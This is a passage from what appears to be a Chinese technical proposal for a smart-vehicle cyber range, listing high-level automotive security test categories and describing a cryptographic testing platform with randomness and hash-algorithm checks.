者利用内存漏洞进行攻击；应用授权管理安全性：应用授权管理安全性测试用例关注应用程序的授权管理安全性，以防止未经授权的应用程序访问敏感数据；系统服务安全性：系统服务安全性测试用例测试系统服务的安全性，确保其不容易受到攻击。</li><li>整车车内通信安全用例，包含车载CAN总线抗DoS测试：车载CAN总线抗DoS测试用例旨在验证车载CAN总线对拒绝服务攻击（DoS）的抵御能力；CAN报文抗重放测试：CAN报文抗重放测试用例主要是对CAN总线中的报文进行录制，在通过重放手段将录制的报文重新发送到总线上，检测其是否具备抗报文重放的能力；CAN总线模糊测试：CAN总线模糊测试用例对CAN总线进行模糊测试，以发现潜在的漏洞和安全弱点；诊断访问信息安全测试：诊断访问信息安全测试用例关注诊断访问功能的安全性，以防止未经授权的访问和数据泄露；诊断数据包防御信息安全测试：诊断数据包防御信息安全测试用例测试系统对恶意数据包的防御能力；诊断模糊测试：诊断模糊测试用例针对诊断协议进行模糊测试，以发现潜在的漏洞和错误处理问题；诊断复位测试：诊断复位测试用例测试系统对复位指令的安全处理能力；诊断读写服务测试：诊断读写服务测试用例测试系统对读写服务的安全性，以确保只有授权用户可以进行读写操作；诊断动作指令测试：诊断动作指令测试用例用于验证系统对动作指令的安全处理能力；诊断通讯控制服务测试：通过验证总线诊断通讯控制服务的基本功能是否正常工作，例如CAN总线的连接与断开、消息的发送与接收等，检查诊断通讯控制服务的功能性、性能和安全性。</li><li>整车USB接口安全用例，包含调试功能分析：调试功能分析用例对USB接口的调试功能进行分析，以防止未经授权的访问和滥用；固件更新逻辑分析：固件更新逻辑分析用例测试系统中固件更新的逻辑流程，以确保固件更新过程的安全性和完整性；恶意木马导入：恶意木马导入用例测试系统中USB接口对恶意木马的防御能力。</li><li>整车车载以太网安全用例，包含车载以太网服务探测：车载以太网服务探测测试用例旨在对车载以太网服务进行探测和识别，以确保只有合法的服务在运行；车载以太网服务认证：车载以太网服务认证测试用例测试系统对车载以太网服务的身份验证机制，以检查非授权的用户是否能访问数据，避免数据泄露；车载以太网重放攻击测试：车载以太网重放攻击测试用例模拟重放攻击场景，以验证系统对重放攻击的防御能力；车载以太网未授权接入测试：车载以太网未授权接入测试用例测试系统对未授权设备的接入进行检测和拦截；车载以太网模糊测试：车载以太网模糊测试用例对车载以太网进行模糊测试，以发现潜在的漏洞和安全弱点；车载以太网端口扫描：车载以太网端口扫描测试用例测试系统对车载以太网端口的扫描和监控能力。</li><li>整车APP应用信息安全用例，包含APP安装包签名校验：对APP的安装包进行签名校验，以确保APP的完整性和真实性，防止篡改和恶意软件的安装；APP代码安全：对APP的代码进行安全审查和漏洞扫描，以发现潜在的安全问题和漏洞，并及时修复，防止黑客利用漏洞进行攻击；APP加固安全：对APP进行加固处理，包括代码混淆、反调试、代码加密等措施，提高APP的抗攻击能力，防止逆向工程和恶意篡改；密钥与证书安全：对APP中使用的密钥和证书进行安全管理，包括密钥存储、密钥传输、密钥更新等，确保密钥的机密性和完整性，防止密钥泄露和伪造；日志安全：对APP生成的日志进行安全检测，包括日志的加密、存储和传输的安全性；隐私、敏感信息安全：评估APP在数据收集、存储、访问控制和传输过程中的安全性，以确保用户的个人数据得到适当的保护和处理；APP应用登入业务逻辑：对APP的用户登录功能进行安全测试，包括用户身份验证、密码安全、登录限制等；APP应用注册安全：对APP的用户注册功能进行安全测试，包括输入验证、验证码机制、注册限制等；APP通信保密检测：对APP的通信进行加密和保密检测，包括使用HTTPS协议、TLS/SSL证书验证等。</li><li>整车无线电信息安全用例，包含蜂窝网络数据篡改仿冒：测试恶意攻击者是否能够伪造或篡改蜂窝网络中的数据；敏感数据分析：测试攻击者是否能够从无线电信号中获取敏感数据；拒绝服务攻击测试：测试恶意攻击者是否能够通过发送大量无效数据或占用网络带宽的方式使整车系统中的无线电通信服务不可用；加密传输测试：测试整车系统中的无线电通信是否采用加密技术，以确保通信过程中的数据安全和隐私保护；双向身份认证测试：测试整车系统中的无线电通信是否采用双向身份认证机制，以防止未经授权的访问；WiFi中间人攻击：测试恶意攻击者是否能够利用WiFi中间人攻击方式，获取用户的敏感信息或篡改数据；协议脆弱性分析：测试车辆无线通信协议的安全漏洞和潜在攻击面，包括协议解析、数据包篡改、重放攻击等方面，以识别和修复协议中存在的脆弱性，提高整车通信的安全性和防护能力；已知漏洞POC：测试已知的无线电通信漏洞是否能够被攻击者利用；弱密码检测：测试整车系统中的无线电通信是否采用强密码机制，以防止密码被猜测或破解；广播监听测试：测试是否存在窃听风险，以保护用户通信的机密性；GPS干扰测试、欺骗：测试是否存在GPS信号干扰和欺骗，以确保GPS定位的准确性和可靠性；射频重放攻击、低频中继攻击：测试恶意攻击者是否能够利用射频重放攻击和低频中继攻击方式，获取用户的敏感信息或篡改数据；TPMS抗干扰、抗重放、加密防篡改测试：测试整车系统中的TPMS是否能够抵御干扰、重放攻击和篡改，并确保TPMS数据的准确性和可靠性。</li><li>整车云平台信息安全用例，包含配置管理测试：测试整车云平台的配置管理机制是否有效，以防止未经授权的访问和配置更改；域名测试：测试整车云平台的域名是否存在安全漏洞，以保护域名和相关服务的安全性；开放端口测试：通过对云平台进行网络端口扫描，检测平台是否存在开放的端口，并验证其开放端口是否存在安全风险，以防止攻击者利用开放端口进行攻击；架构安全、组件安全和上传缺陷：测试整车云平台的架构和组件是否存在安全漏洞，以及上传功能是否存在缺陷，以防止攻击者利用这些漏洞进行攻击；基础结构和应用管理接口安全：测试整车云平台的基础结构和应用管理接口是否存在安全漏洞，以确保系统接口的安全性；基础配置管理缺陷：测试整车云平台的基础配置管理是否存在缺陷，以及缺陷是否能够被攻击者利用；常见业务逻辑缺陷：测试整车云平台的业务逻辑是否存在漏洞，以防止攻击者利用这些漏洞进行攻击；限制功能前端绕过：如果一个应用程序只在前端（如在用户的浏览器中）执行安全检查来限制功能，攻击者可能会绕过这些检查。例如，通过修改JavaScript代码或使用开发者工具来更改客户端逻辑，从而访问或执行本应受限的功能。用户认证缺陷：这涉及到用户登录系统的过程中存在的安全问题。如果认证机制存在缺陷，例如弱密码政策、缺乏账户锁定机制或不安全的密码恢复流程，攻击者可能会利用这些缺陷来获取未授权的访问权限。资源访问：这与系统中资源的访问控制机制有关。如果访问控制策略实施不当，用户可能会访问到不应该获得的数据或功能。权限检测：权限检测是指系统如何确认用户或进程是否有权执行特定操作。如果权限检测机制存在漏洞，攻击者可能会执行未授权的操作。会话缺陷：会话管理缺陷可能导致攻击者劫持用户会话，通过会话固定、会话预测或会话令牌泄露等方式，获取用户的会话控制权。参数值篡改：这是指攻击者更改URL、表单字段、隐藏的输入元素、Cookie、HTTP头等参数值，以试图欺骗应用程序执行未授权的操作。多参数验证：多参数验证是指应用程序需要验证多个参数才能正确执行操作。如果验证步骤不完整或者可以被绕过，攻击者可能会利用这一点来执行恶意操作。注入攻击：注入攻击是指攻击者在输入中插入（注入）恶意数据，使应用程序执行非预期的命令或查询。最常见的例子是SQL注入，但也包括XML注入、LDAP注入等。客户端攻击用例：这是指攻击者针对客户端应用程序的攻击，例如通过恶意的输入或数据来利用浏览器的漏洞，或者通过跨站脚本（XSS）、跨站请求伪造（CSRF）等攻击来损害用户的客户端。</li><li>整车业务系统信息安全用例，包含控车业务车端测试：这项测试专注于汽车端的控制系统，确保车辆能够安全地接收和处理来自远程命令的信号，包括但不限于启动、停止、锁定、解锁和导航等功能；手机端测试：针对用户使用的移动应用程序进行安全测试，以确保应用程序能够安全地与车辆进行通信，包括数据传输的加密、用户认证机制的安全性以及应用程序本身的安全性；云端业务逻辑安全测试：检查云平台上实现的业务逻辑是否存在安全缺陷，例如逻辑错误可能导致未授权访问或数据泄露；云端服务安全测试：评估云端服务组件的整体安全性，包括服务器、数据库和其他云基础设施的安全配置，以及数据在云中的存储和处理方式；远程控车应用安全：确保用户可以安全地通过移动设备或其他远程接口控制车辆，防止未授权的远程访问；PKI系统证书签发测试：测试PKI系统中证书签发的安全性，包括证书申请、审批、生成、分发和撤销的过程；身份认证测试：验证系统中实施的身份认证机制的安全性，确保只有授权用户能够访问敏感操作和数据；权限检测测试：测试系统是否正确实施了权限控制，确保用户只能访问其权限范围内的资源和数据；认证管理测试：检查认证信息的管理方式是否安全，包括用户凭证的存储、传输和生命周期管理；策略控制测试：评估安全策略的实施情况，确保策略能够正确地控制访问权限、用户行为和资源使用；证书注册中心测试：测试证书注册中心的安全性，包括证书申请和颁发流程的安全性，以及证书数据的存储安全性；密钥管理中心安全：这涉及到密钥管理中心（KMC）的安全性，确保密钥的生成、存储、分发、使用和废弃等生命周期管理过程都是安全的；远程升级固件包安全测试：评估通过远程方式更新固件包的安全性，包括固件的完整性、鉴权和固件升级过程的安全性；升级流程测试：测试升级过程中的各个步骤，确保在升级过程中不会出现安全漏洞，如中断服务攻击（DoS）或未授权访问；通信安全测试：评估系统内部和外部通信的安全性，包括数据在传输过程中的加密和保护机制；身份认证测试：确认系统中实施的身份认证机制的安全性，确保只有授权用户才能访问系统资源；证书签发测试：确保PKI系统中的证书签发流程是安全的，包括证书申请、验证、签发和吊销；API接口测试：测试应用程序接口（API）的安全性，包括验证输入、身份认证、权限控制和数据传输安全；云端服务安全：确保云服务提供商提供的服务（如计算、存储、数据库）符合安全标准，数据安全和隐私得到保护；数字钥匙车端测试：测试车辆端数字钥匙的安全性，确保只有授权的设备和用户可以解锁和启动车辆；手机端测试：验证与数字钥匙相关的移动应用程序的安全性，包括应用程序的数据存储和传输安全；云端业务逻辑安全测试：检查云端实现的业务逻辑是否存在安全漏洞，以防止潜在的攻击；云端服务安全测试：评估云服务的整体安全性，包括服务配置、用户数据保护和网络安全；数字钥匙代码安全：确保实现数字钥匙功能的代码是安全的，没有编程错误或漏洞；摄像头硬件测试：检查车辆摄像头硬件的安全性，包括物理访问控制和数据传输的安全；摄像头存储测试：评估摄像头部存储设备的安全性，确保敏感数据安全存储；摄像头总线测试：检查连接摄像头通信总线（如CAN总线）的安全性，防止数据被截获或篡改；摄像头接口测试：测试摄像头内部和外部接口的安全性，总线接口或网络接口；摄像头通信测试：确保摄像头内部和外部通信是安全的，特别是无线通信如Wi-Fi或蓝牙；摄像头启动及业务逻辑安全：验证摄像头启动过程和业务逻辑的安全性，确保启动过程中没有安全漏洞；自动泊车硬件测试：测试自动泊车系统的硬件组件，如传感器和执行器的安全性；自动泊车存储测试：评估自动泊车存储设备的安全性，确保敏感数据安全存储；自动泊车总线测试：检查自动泊车通信总线（如CAN总线）的安全性，防止数据被截获或篡改；自动泊车接口测试：测试自动泊车内部和外部接口的安全性，总线接口或网络接口；自动泊车通信测试：确保自动泊车内部和外部通信是安全的，包括无线通信如Wi-Fi、蓝牙，总线、车载以太网等；自动泊车启动及业务逻辑测试：验证车辆启动过程和业务逻辑的安全性，确保启动过程中没有安全漏洞。远程诊断通信测试：评估远程诊断功能的通信安全性，确保诊断数据的安全传输；远程诊断应用测试：测试车辆相关应用程序的安全性，包括第三方应用程序；远程诊断业务逻辑测试：验证远程诊断的握手、用户认证、秘钥安全是否按照既定设计流程进行。自动驾驶访问点及传感器安全测试：评估自动驾驶系统的访问点和传感器的安全性，确保它们不会成为攻击的入口；自动驾驶视频流测试：测试车辆摄像头的视频流的安全性，确保视频数据不被未授权访问或篡改；自动驾驶总线通信安全测试：评估车辆内部总线系统的通信安全性，防止潜在的攻击者监听或注入消息；自动驾驶固件安全等用例：确保车辆固件的安全性，防止固件被篡改或利用固件中的漏洞进行攻击。</li><li>提供了300余条的整车测试用例，以用于对整车的功能、性能和可靠性进行测试和评估。这些测试用例涵盖了各种不同的测试场景和条件，旨在全面检验整车的各项特性和功能是否符合要求。</li></ol><h5 id="技术实现内容-21"><a href="#技术实现内容-21" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><ol><li>确定测试目标</li></ol><p>明确整车信息安全测试的目标和范围。确定要测试的信息安全功能和机制，例如身份验证、数据加密、通信安全等。了解整车系统的信息安全需求和规范，以确定测试的重点和覆盖范围。</p><ol><li>收集安全需求和规范</li></ol><p>收集整车系统的安全需求文档、规范和设计文档。了解整车系统的安全功能要求、安全机制和安全标准等。这些文档将成为编写测试用例的重要参考。</p><ol><li>制定测试策略</li></ol><p>制定整车信息安全测试的策略和计划。确定测试的级别（系统级安全测试、网络通信安全测试等），以及测试的方法和技术。考虑使用安全评估工具和技术来发现潜在的安全漏洞和风险。</p><ol><li>确定安全测试场景</li></ol><p>基于安全需求和规范，确定整车信息安全测试的关键场景和使用情境。考虑不同的攻击场景、威胁模型和安全漏洞类型等。确保测试场景具有多样性和代表性，能够覆盖整车系统的信息安全方面。</p><ol><li>编写安全测试用例</li></ol><p>根据安全需求和规范，编写详细的整车信息安全测试用例，用例数量300余条。测试用例应该覆盖不同的安全场景、攻击方式和安全措施。确保测试用例具有清晰的预期结果和验证步骤。</p><ol><li>组织测试用例库</li></ol><p>将编写的整车信息安全测试用例组织成一个结构化的测试用例库。可以按照安全功能、攻击类型、安全场景等进行分类和组织。确保测试用例库易于管理和维护，并具有良好的可搜索性和可复用性。</p><ol><li>执行安全测试用例</li></ol><p>根据安全测试计划和策略，执行整车信息安全测试用例。使用合适的安全评估工具和技术进行测试，发现潜在的安全漏洞和风险。记录测试结果、问题和缺陷。</p><ol><li>分析和改进</li></ol><p>分析整车信息安全测试结果和问题，识别潜在的安全漏洞和改进点。根据测试结果进行调整和改进测试用例和测试策略。持续改进整车信息安全测试用例库，以提高测试效率和安全性。</p><ol><li>持续维护和更新</li></ol><p>随着整车系统的演进和变化，持续维护和更新安全测试用例库。跟踪安全需求和规范的变化，及时更新测试用例以适应新的安全威胁和风险。</p><h1 id="智能汽车网络靶场工具库-密码检测工具"><a href="#智能汽车网络靶场工具库-密码检测工具" class="headerlink" title="智能汽车网络靶场工具库-密码检测工具"></a>智能汽车网络靶场工具库-密码检测工具</h1><h2 id="技术路线-4"><a href="#技术路线-4" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="智能汽车网络靶场密码检测测试工具"><a href="#智能汽车网络靶场密码检测测试工具" class="headerlink" title="智能汽车网络靶场密码检测测试工具"></a>智能汽车网络靶场密码检测测试工具</h3><p>可对安全协议进行检测，对于可识别的协议，系统根据不同的连接进行展示，并将解析到的每条连接的隧道交互过程信息展示给用户。</p><p>对于TLS/SSL 协议，展示的隧道交互过程包括客户端与服务端的握手信息、证书信息等。</p><p>对于 IPSec 协议，展示的隧道交互过程包括主模式、快速模式、安全通信中的数据包相关信息。</p><p>可针对通信双方使用的国密IPSECVPN、SSLVPN、TLCP、SSH、HTTPS、SSL/TLS验证通信数据的安全性。</p><p>密码检测工具包含商用密码应用安全性检测平台、网络传输密码使用检测仪、智能网联V2X密码应用安全检测工具、密码应用漏洞扫描系统等4个组件。</p><h4 id="商用密码应用安全性检测平台"><a href="#商用密码应用安全性检测平台" class="headerlink" title="商用密码应用安全性检测平台"></a>商用密码应用安全性检测平台</h4><h5 id="功能实施方案-24"><a href="#功能实施方案-24" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>产品信息如下：</p><p>品牌：联想</p><p>型号：IPC-830-H110</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>设备采用4U机架式设计，这种尺寸的设备可安装在机架内，作为4U机架式设备，它可以充分利用机架空间，4U的尺寸为内部组件提供了充足的空间，适合那些需要额外插槽或驱动器的高性能服务器或存储设备；</li><li>设备具备2个USB接口，这提供了灵活的外设连接选项。用户可以通过这些接口连接各种USB设备，如外部硬盘驱动器、闪存驱动器或备份设备，以便进行数据迁移、系统更新或日常维护操作；</li><li>网络接口配置2个10/100/1000M的电口，每个接口能够自动适应10Mbps、100Mbps或1000Mbps的网络速度。这种多速率能力确保了设备能够与各种网络环境兼容。</li></ol><h5 id="技术实现内容-22"><a href="#技术实现内容-22" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><ol><li>确定检测目标</li></ol><p>明确商用密码应用安全性检测的目标和范围。确定要评估的密码应用程序，例如密码管理器、身份验证系统等。了解密码应用程序的安全要求和规范，以确定测试的重点和覆盖范围。</p><ol><li>收集安全需求和规范</li></ol><p>收集密码应用程序的安全需求文档、规范和设计文档。了解密码应用程序的安全功能要求、安全机制和安全标准等。这些文档将成为评估和测试的重要参考。</p><ol><li>设计评估策略</li></ol><p>制定商用密码应用安全性评估的策略和计划。确定评估的方法和技术，例如静态代码分析、动态漏洞扫描、安全审计等。考虑使用自动化工具和手动审查相结合的方法来提高评估效率和准确性。</p><p>在平台设计中，采用4U机架式设备作为基础，配置USB口两个，网口两个。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/626f22a924cb8f30dab71465590c4586.png"></p><p>4U平台</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/13abb874ddffa1b13ff43cb0d8b5c827.png"></p><p>双网口设计</p><ol><li>确定评估场景</li></ol><p>基于安全需求和规范，确定商用密码应用安全性评估的关键场景和使用情境。考虑不同的攻击场景、威胁模型和安全漏洞类型等。确保评估场景具有多样性和代表性，能够覆盖密码应用程序的各个安全方面。</p><ol><li>执行安全性评估</li></ol><p>根据评估策略和场景，执行商用密码应用安全性评估。使用合适的工具和技术进行评估，发现潜在的安全漏洞和风险。进行代码审查、漏洞扫描、安全配置审计等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析商用密码应用安全性评估结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进密码应用程序的安全功能和机制。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成安全性评估报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>商用密码应用安全性评估是一个持续的过程。建议定期进行安全性评估，以及在密码应用程序有重大更新或变更时进行评估。跟踪安全需求和规范的变化，及时更新评估策略和方法。</p><h6 id="随机数检测"><a href="#随机数检测" class="headerlink" title="随机数检测"></a>随机数检测</h6><p>功能实施方案</p><p>随机数检测支持满足GM/T 0005-2021《随机性检测》（15项）和NIST SP 800-22 的随机性检测（15项），为二元序列的随机性检测提供检测支撑和用于测试由基于硬件或软件的加密随机数或伪随机数生成器生成的(任意长)二进制序列的随机性。</p><p>基于GM/T 0005-2021的随机性检测（15项）响应</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4c88f85f7f95b31ed97d341439224a58.png"></p><ol><li>单比特频数检测：检测二元序列中0和1的出现频率是否接近于50%。通过统计0和1的数量，并计算其与理论频率的偏离程度，可以判断序列是否具备足够的随机性，检测伪随机数生成器生成的随机数序列的质量</li><li>块内频数检测：检测一个二进制序列中相邻的固定长度的块出现的频率是否符合期望。该方法将序列分成不重叠的块，并计算每个块中0和1的数量，然后根据理论频率计算每种块类型的期望数量，最终通过统计实际出现的块数量和期望数量之间的差异来判断序列的随机性，用于检测伪随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在错误。</li><li>扑克检测：检测一个二进制序列中是否存在特定的扑克牌组合。该方法将序列分成不重叠的5位二进制数（类似于扑克牌），并检查它们是否符合扑克牌的规则，用于检测随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在错误。</li><li>重叠子序列检测：检测一个二进制序列中是否存在重复的子序列。该方法将序列分成固定长度的子序列，并检查相邻的子序列是否存在重叠，用于检测随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在错误。</li><li>游程总数检测：检测序列中连续重复出现的0或1的总数是否符合预期。该方法将序列中相邻的相同位数组成游程，并计算序列中所有游程的总数，然后根据理论频率计算期望的游程总数。最终通过比较实际游程总数和期望游程总数之间的差异来判断序列的随机性，用于检测随机数生成器生成的随机数序列的质量，以及检测数据传输中是否出现异常情况。</li><li>游程分布检测：检测二元序列中各个游程长度出现的频率是否符合预期。该方法将序列中相邻的相同位数组成游程，并将游程长度分成多个区间，然后统计每个区间内游程长度出现的频率，并根据理论频率计算期望的频率。最终通过比较实际的游程长度分布和期望的游程长度分布之间的差异来判断序列的随机性，用于检测随机数生成器生成的随机数序列的质量，以及检测数据传输中是否出现异常情况。</li><li>块内最大1游程检测：检测序列中连续出现的最长的1游程的长度是否符合预期。该方法将序列中相邻的1位组成游程，并计算序列中最长的1游程的长度，然后根据理论频率计算期望的最长1游程长度。最终通过比较实际的最长1游程长度和期望的最长1游程长度之间的差异来判断序列的随机性。最大1游程检测可用于评估随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在异常情况。</li><li>二元推导检测：通过对二元序列进行压缩来推导出一个模型，并计算压缩率作为序列随机性的度量。如果序列具有高随机性，则难以被压缩，相应的压缩率就会比较低；反之，如果序列具有低随机性，则容易被压缩，相应的压缩率就会比较高。二元推导检测可以用于评估随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在异常情况。</li><li>自相关检测：检测序列中是否存在自相关性。自相关是指序列中当前位与之前某个时刻的位之间的相关性。这种检测方法通过计算序列在不同的位移下的自相关系数，来判断序列是否具有随机性。如果序列具有高随机性，则自相关系数应该接近于0；而如果序列存在自相关性，则自相关系数会偏离0。根据自相关系数的分布情况，可以对序列的随机性进行评估。自相关检测可以用于评估随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在异常情况。</li><li>矩阵秩检测：检测序列中是否存在线性相关性。该方法将二元序列分成多个子序列，并将每个子序列转换成一个矩阵，然后计算矩阵的秩。如果矩阵秩等于子序列长度，则表明子序列中不存在线性相关性；反之，如果矩阵秩小于子序列长度，则表明子序列中存在线性相关性。通过对多个子序列进行矩阵秩检测，可以综合评估序列的随机性。矩阵秩检测可以用于评估随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在异常情况。</li><li>累加和检测：检测序列中0和1出现的频率是否趋于平衡。该方法将二元序列中的每一位依次累加，并计算累加和的最大值和最小值之差。如果序列具有高随机性，则累加和的最大值和最小值之差应该比较小；反之，如果序列存在偏差，则累加和的最大值和最小值之差会比较大。通过比较实际计算出的累加和的最大值和最小值之差与理论值之间的差异来判断序列的随机性。累加和检测可以用于评估随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在异常情况。</li><li>近似熵检测：检测序列中的信息熵。信息熵是描述序列中包含的信息量的度量，用于判断序列的随机性和复杂性。近似熵检测通过计算序列中不同长度的子序列的熵值，并与理论随机序列的熵值进行比较来判断序列的随机性。如果序列具有高随机性，则其熵值应该接近于理论随机序列的熵值；反之，如果序列存在规律性或重复性，则熵值会偏离理论值。通过比较实际计算出的熵值与理论值之间的差异来评估序列的随机性。近似熵检测可以用于评估随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在异常情况。</li><li>离散傅里叶变换：将二元序列转换为频域上的复数序列，其中每个复数表示序列在不同频率上的振幅和相位信息。通过观察序列在频域上的能量分布和频率成分的存在情况，可以判断序列是否具有随机性或规律性。离散傅里叶变换可以用于评估随机数生成器生成的随机数序列的质量，以及检测数据传输中是否存在异常情况。</li><li>线性复杂度检测：通过分析序列中线性关系的存在来检测序列的复杂度。在线性复杂度检测中，将序列表示为二进制向量，并通过构建线性方程组的方式来推断序列的线性复杂度。通过对序列进行线性复杂度检测，判断序列是否具有足够的复杂度，即是否能够提供足够多的信息，以使其在实际应用中充当有效的伪随机数序列。较低的线性复杂度可能表明序列存在规律性或周期性，从而削弱了序列的随机性质，通过对伪随机数生成器输出序列进行线性复杂度检测，可以评估其质量和安全性。</li><li>Maurer通用统计检测：通过计算序列的最小生成长度来度量序列的复杂度和随机性，通过对伪随机数序列进行Maurer通用统计检测，可以评估其质量和安全性。</li></ol><p>NIST SP 800-22 的随机性检测支持根据待测数据的大小，可以进行合适的调整来确定适当的分组长度和分组数，以平衡计算复杂度和统计结果的准确性，支持一级检测（即通过率）和二级检测（p 值分布）和支持改进的Q_value 值检测，一级检测用于初步筛选，评估序列的整体随机性；二级检测和改进的Q值检测则提供更详细的统计信息，用于进一步评估序列在多个统计测试中的随机性质量。</p><p>基于NIST SP 800-22 的随机性检测（15项）响应</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/80adf22140c9403a8c79c1bad9a6e970.png"></p><ol><li><p>频数（单比特）检测：这个测试用来评估序列中0和1的总数是否几乎相等。理想情况下，一个随机序列的0和1的数量应该是大致相同的。如果某一比特明显多于另一比特，那么序列可能不是随机的。</p></li><li><p>块内频数检测：将序列分割成非重叠的块，并在每个块中独立计算0和1的数量。每个块内的比特数量应接近于块大小的一半。这个测试可以揭示在小范围内的非随机性。</p></li><li><p>游程检测：游程是指序列中连续相同比特的串。这个测试计算不同长度的游程在序列中出现的次数，并与随机序列的期望次数进行比较。随机序列中短游程的数量应该多于长游程。</p></li><li><p>块内最长1游程检测：在给定大小的块内，这个测试确定连续的1的最长游程，并将其与随机序列中的最长游程的预期长度进行比较。如果最长游程太长或太短，可能表明序列不是随机的。</p></li><li><p>二元矩阵秩检测：此测试将序列转换成二维矩阵，并计算该矩阵的秩，即线性独立行或列的最大数目。一个随机序列生成的矩阵应该有一个高的秩。如果矩阵的秩异常低，则可能表明序列包含太多重复的模式。</p></li><li><p>离散傅里叶变换检测：应用离散傅里叶变换（DFT）于序列，以检测序列中的周期性特征。在频域中，一个随机序列应该没有显著的峰值，因为这可能表明存在周期性，而周期性是非随机性的迹象。</p></li><li><p>非重叠模版匹配检测：选择一个特定的比特模式（称为模版），然后在序列中搜索这个模版的匹配实例。每个模版匹配后，跳过到模版长度的下一个块继续搜索。比较实际匹配次数与随机序列预期匹配次数之间的差异。</p></li><li><p>重叠模版匹配检测：类似于非重叠模版匹配测试，但在这个测试中，即使找到匹配，搜索也会继续，允许模版匹配重叠。这可以用来检测序列中是否过度或不足匹配特定模式。</p></li><li><p>线性复杂度检测：线性复杂度是指生成序列所需的最小线性反馈移位寄存器（LFSR）的长度。这个测试使用Berlekamp-Massey算法来确定序列的线性复杂度。一个随机序列应该具有较高的线性复杂度。</p></li><li><p>Maurer’s通用统计检测：该测试测量新比特的出现与之前相同比特出现之间的平均距离。它旨在评估序列在较长距离上的随机性。一个随机序列应该表现出高度的不可预测性。</p></li><li><p>序列检测：这个测试检查0和1在整个序列中的全局比例是否接近1:1。它与频数（单比特）检测类似，但是应用于整个序列。</p></li><li><p>近似熵检测：近似熵测试评估序列中模式的频率和规律性。对于固定长度的子序列，它计算不同模式出现的概率，并比较相邻长度模式的概率差异，以确定序列的熵。</p></li><li><p>累加和检测：对序列的累加和进行测试，将序列视为一个随机游走。此测试评估序列中累积值的极值，以及序列作为一个随机游走的行为。</p></li><li><p>随机游走检测：类似于累加和测试，但更进一步分析随机游走的路径。它可以包括检查随机游走的最大偏离度，以及它是如何随时间变化的。</p></li><li><p>随机游走变量检测：这个测试评估随机游走的统计特性，例如，游走的变量在序列中的分布和独立性。</p><p>随机数检测方案设计</p></li><li><p>确定评估目标</p></li></ol><p>明确随机数检测的目标和范围。确定要评估的随机数生成算法，例如伪随机数生成器（PRNG）或真随机数生成器（TRNG）。了解随机数的应用场景和安全要求，以确定评估的重点和覆盖范围。</p><ol><li>收集随机数生成算法规范</li></ol><p>收集随机数生成算法的规范和设计文档。了解算法的设计原理、输入输出规范、安全性要求等。这些文档将成为评估和测试的重要参考。</p><ol><li>设计评估策略</li></ol><p>制定随机数检测的策略和计划。确定评估的方法和技术，例如统计分析、频率测试、均匀性测试、相关性测试等。考虑使用公开可用的随机性检测库或工具来辅助评估。</p><p>随机数检测中功能可支持GM/T 0005-2021和NIST SP 800-22 的随机性检测。</p><ol><li>确定评估场景</li></ol><p>基于随机数生成算法的规范和安全要求，确定随机数检测的关键场景和使用情境。考虑不同的输入条件、参数设置和使用方式等。确保评估场景具有多样性和代表性，能够覆盖随机数生成算法的各个安全方面。</p><ol><li>执行随机数检测</li></ol><p>根据评估策略和场景，执行随机数检测。使用合适的工具和技术进行评估，对生成的随机数进行统计分析和测试。进行频率分析、均匀性测试、相关性测试等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析随机数检测结果和问题，识别潜在的随机性缺陷和改进点。根据评估结果进行调整和改进随机数生成算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成随机数检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的随机性问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>随机数检测是一个持续的过程。建议定期进行随机数检测，以及在随机数生成算法有重大更新或变更时进行评估。跟踪随机数生成算法的安全标准和最佳实践，及时更新评估策略和方法。</p><h6 id="杂凑算法检测"><a href="#杂凑算法检测" class="headerlink" title="杂凑算法检测"></a>杂凑算法检测</h6><p>功能实施方案</p><p>杂凑算法支持实现 MD4、MD5、SHA1、SHA2 系列、SHA3 系列和国密算法 SM3密码杂凑算法的 Hash 与HMAC 功能。</p><p>1）支持对文件类型和消息类型不同杂凑算法的检测，支持算法包括MD4、MD5、SHA1、SHA2 系列、SHA3 系列和国密算法 SM3。这些算法能够计算出固定长度的杂凑值，用于验证数据的完整性和安全性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e33bd737bd84ae279c66f5ec101f4e0c.png"></p><p>2）支持将数据从原始格式转换为其他格式（包括二进制、十六进制、BASE64或BASE64URL），或者将数据从其他格式转换回原始格式。无论是进行数据传输还是进行数据存储，工具都能够提供输出格式转换的支持。</p><p><img src= 